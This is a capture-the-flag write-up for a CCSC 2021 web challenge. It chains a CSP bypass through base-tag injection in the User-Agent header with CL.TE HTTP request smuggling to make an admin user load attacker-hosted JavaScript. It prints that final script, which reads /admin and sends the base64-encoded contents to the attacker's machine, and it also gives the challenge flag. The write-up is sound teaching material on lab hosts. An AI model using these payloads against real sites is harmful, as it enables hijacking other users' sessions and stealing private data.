---
title: CCSC 2021&#58; Synchronous Chess
tags: ccsc web xss smuggling writeup
---

## Description
The final match of the Moscow Invitational (1968) has been adjourned at the request of the defending World Champion, Vassily Borgov. His next move has been stored for safe keeping by the arbiters of the tournament, until the match resumes tomorrow. However, the arbiters cannot be trusted 100% so we need to help Beth smuggle out the move so she can be sure that no foul play will abound.

Challenge running at: [http://192.168.125.11:7000](http://192.168.125.11:7000/)

___

Reading the description i didn't get any hint towards what the challenge might be, so i quickly opened the web app and started testing. The web apps home page greets us with a login page.

![](images/Pasted%20image%2020210421194104.png)

I first tried some defualt easy-to-guess credentials but no luck there, then i thought about testing for SQL injections but before i started testing i wanted to first enumerate the application a litte, so i started up burp and checked for 404,401,500 and 400 error pages and something odd stood out to me.

As you can see from the image below, a 404 error prints my user-agent at the bottom, but that didnt show in the web app, sneaky author. Next i tested for XSS by changing my user agent to `User-Agent: <script>alert(1)</script>`

![](images/Pasted%20image%2020210421194558.png)

![](images/Pasted%20image%2020210421194907.png)

The script tag got injected to the web app but did not work so i opened my developer tools to check what the error might be:

![](images/Pasted%20image%2020210421194948.png)

Looks like the CSP (Content Security Policy) protected this web page from executing my inline javascript. One can find the CSP configuration from the response headers, in this case it was: 
```
default-src 'self'; script-src 'self' 'nonce-UpZ2W3JTsZCvHOlE'; img-src 'self'; object-src 'none'
```

I quickly threw this policy in a [CSP Evaluator](https://csp-evaluator.withgoogle.com/) and it showed an error that the CSP might be bypassable:


![](images/Pasted%20image%2020210421195241.png)

```
Missing base-uri allows the injection of base tags. They can be used to set the base URL for all relative (script) URLs to an attacker controlled domain. Can you set it to 'none' or 'self'?
```

I googled online what a [base](https://www.w3schools.com/tags/tag_base.asp) tag is, basically you can add a `base` tag to reference the url that contains all included javascript/css files. Meaning if i add a `base` tag like:

`<base href="http://attacker.com">`

and the web page wanted to fetch `/js/main.js` it would make a request to `http://attacker.com/js/main.js`, and since i control the attacker domain i can easily clone the directory tree and include my own javascript file, bypassing the CSP and getting XSS. 

The CCSC gave all its competitors an attack machine (192.168.125.100) which we could use to get reverse shells, etc. since the challenges cannot access the internet.

I next viewed the source code of the app to see which javascript file i could fake, i used `/static/js/main.js`. I ssh'ed into my attack machine, created the directory tree and a `main.js` file with `alert(1)` as its contents. Then i used `php` to start a web server on port `1234`

![](images/Pasted%20image%2020210421201658.png)

Next i made the same request to get a 404 response but with a `User-Agent` like so: `User-Agent: <base href="http://192.168.125.100:1234/">`. Sent the request and requested the reponse in my browser. As you can see from the screenshot below  it worked! The web page requested the `main.js` file from my attack machine and found it, executing my alert.

![](images/Pasted%20image%2020210421201736.png)

Up until this part was quite easy for me, i had reflected XSS on the web site but did not know how that could help me further. How can i make another user send a request with a custom user-agent? After digging in the application a bit more i noticed a `/admin` path that was restricted, i did not try any header manipulating techniques to bypass the ip restriction since i was 99% sure that the XSS was there for a reason.

![](images/Pasted%20image%2020210421202541.png)

Since i was stuck i went to [burp academy](https://portswigger.net/web-security/all-labs) (I believe you need an account to view the labs) and checked all the Labs that were available, maybe get an idea how to exploit my reflected XSS further and noticed one lab that could help me.

![](images/Pasted%20image%2020210421203024.png)

Http request smuggling sounds perfect for this challenge, in simple terms if the web app is prone to http request smuggling i could send a request like the below screenshot. By abusing the `Content-Length` or `Transfer-Encoding` header the front-end and backend do not aggree on which one to use, as a result the back-end views the smuggled request as a seperate one, this request get stored in the web cache and the next request another user makes will get the response of the smuggled request. 

![](images/Pasted%20image%2020210421204219.png)


I added the `HTTP Request Smuggler` extension to burp suite and scanned the web application for request smuggling on the POST /login endpoint. Then the issue i was expecting appeard, `Possible HTTP Request Smuggling`. 

![](images/Pasted%20image%2020210421221039.png)

Perfect, I sent the above request to my repeater and used the smuggle attack(CL.TE) to check if i could smuggle a request. As you can see from the below screenshots, i smuggle a GET request to a non-exsitent page witin my POST request to `/login`. In the second screenshot we notice that at some point the POST request to `/login` responded with 404!

![](images/Pasted%20image%2020210421221322.png)

![](images/Pasted%20image%2020210421221222.png)

Now all i needed to do is modify the request to include my custom `User-Agent` with the base tag and hopefully i will notice the admin user making requests to my attack machine.

And there you go, i am now getting requests on my attack machine from the admin user

![](images/Pasted%20image%2020210421222129.png)

But all that is happening to the admin user is a simple alert box, i want to see the contents of `/admin`, i updated my `main.js` file to simply make an ajax request to `/admin` and then redirect the admin to my attack machine with `window.location.replace` and add the contents from the ajax request in a GET parameter url encoded

Here is the final payload of `main.js`

```javascript
var x = new XMLHttpRequest(); 
x.open("GET", "http://192.168.125.11:7000/admin");
x.onload = function(){
        response = btoa(x.responseText);
        window.location.replace("http://192.168.125.100:1234/?".concat(response));
 }; 
 x.send(); 
```

Again, sent my smuggled request and BOOM, got the base64 encoded response on my server logs

![](images/Pasted%20image%2020210421224642.png)

Now i just decoded the base64 query parameter and got the flag.

![](images/Pasted%20image%2020210421224814.png)

flag: `CCSC{h77p_R3Qu357_5muGGl1N_15_5up3R_pHuN}`

This was my favourite challenge in the CCSC competition, a big well done to `styx00` for creating such a sick challenge.